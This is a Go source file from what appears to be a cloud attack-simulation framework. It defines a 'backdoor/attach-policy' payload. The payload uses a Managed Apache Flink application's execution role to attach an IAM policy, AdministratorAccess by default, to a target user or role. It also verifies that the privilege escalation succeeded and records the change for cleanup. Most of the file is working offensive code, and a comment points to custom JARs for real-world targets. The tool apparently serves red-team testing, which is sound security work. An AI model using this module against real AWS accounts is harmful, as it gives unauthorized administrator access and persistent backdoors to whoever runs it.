// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package kinesisanalytics

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload targets a Flink JAR that attaches an IAM policy to a
// user or role using the Flink application's service execution role credentials.
//
// Required JAR: kinesisanalytics/backdoor-attach-policy/payload.jar in the attacker
// code bucket, or provide CODE_BUCKET/CODE_KEY manually.
//
// The JAR reads TARGET_ARN and POLICY_ARN from the Flink EnvironmentProperties group
// "PayloadProperties". Note: the lab JAR (exploit-jar/exploit.jar) has these hardcoded
// to the lab scenario values; use a custom JAR for real-world targets.
type BackdoorAttachPolicyPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach an IAM policy to a user or role via a Managed Apache Flink application running with an admin execution role"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceKinesisAnalytics,
		payloads.TagLanguageJava,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role ARN to attach the policy to (auto-resolved from caller identity if unset)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "ARN of the policy to attach",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode is not used for JAR-based payloads — the JAR is pre-compiled.
// Use GetJARKey() to locate the JAR and GetFlinkProperties() to pass parameters.
func (p *BackdoorAttachPolicyPayload) GenerateCode(_ map[string]string) (string, error) {
	return "", nil
}

// ProcessResult formats a human-readable privilege escalation summary from the
// structured JSON the module passes in after successful VerifySuccess confirmation.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	var r struct {
		App       string `json:"app"`
		Role      string `json:"role"`
		TargetARN string `json:"target_arn"`
		PolicyARN string `json:"policy_arn"`
		Region    string `json:"region"`
	}
	if err := json.Unmarshal([]byte(result), &r); err != nil {
		return result, nil
	}

	// Extract short names for readability.
	targetName := r.TargetARN
	if idx := strings.LastIndex(r.TargetARN, "/"); idx != -1 {
		targetName = r.TargetARN[idx+1:]
	}
	policyName := r.PolicyARN
	if idx := strings.LastIndex(r.PolicyARN, "/"); idx != -1 {
		policyName = r.PolicyARN[idx+1:]
	}

	var out strings.Builder
	out.WriteString("Privilege escalation successful.\n\n")
	fmt.Fprintf(&out, "  Target:  %s\n", r.TargetARN)
	fmt.Fprintf(&out, "  Policy:  %s\n", r.PolicyARN)
	fmt.Fprintf(&out, "  Via:     Flink execution role %s\n", r.Role)
	fmt.Fprintf(&out, "  App:     %s (%s)\n\n", r.App, r.Region)
	fmt.Fprintf(&out, "%s now has %s permissions.\n", targetName, policyName)
	return out.String(), nil
}

// GetJARKey returns the S3 key where the universal payload JAR is stored in the
// attacker code bucket. All kinesisanalytics payloads share the same JAR binary;
// PAYLOAD_TYPE in the Flink EnvironmentProperties selects the handler at runtime.
func (p *BackdoorAttachPolicyPayload) GetJARKey() string {
	return "kinesisanalytics/pathrunner-payload/payload.jar"
}

// GetEmbeddedJAR returns the pre-compiled Flink payload JAR bytes embedded in the binary.
func (p *BackdoorAttachPolicyPayload) GetEmbeddedJAR() []byte {
	return GetEmbeddedJAR()
}

// GetFlinkProperties returns EnvironmentProperties to pass to the Flink application.
// The JAR reads these via System.getProperty("PayloadProperties.<key>").
func (p *BackdoorAttachPolicyPayload) GetFlinkProperties(options map[string]string) map[string]map[string]string {
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}
	return map[string]map[string]string{
		"PayloadProperties": {
			"PAYLOAD_TYPE": "backdoor/attach-policy",
			"TARGET_ARN":   options["TARGET_ARN"],
			"POLICY_ARN":   policyArn,
		},
	}
}

// VerifySuccess checks whether the target principal has the specified policy attached.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	iamClient := iam.NewFromConfig(config)

	if principalType == "role" {
		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
			RoleName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	} else {
		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
			UserName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	}
	return false, nil
}

// ReportSideEffects returns the policy attachment for cleanup tracking.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := policyArn
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
func parsePrincipalARN(input string) (name string, principalType string) {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":role/"); idx != -1 {
			return input[idx+len(":role/"):], "role"
		}
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):], "user"
		}
	}
	return input, "user"
}
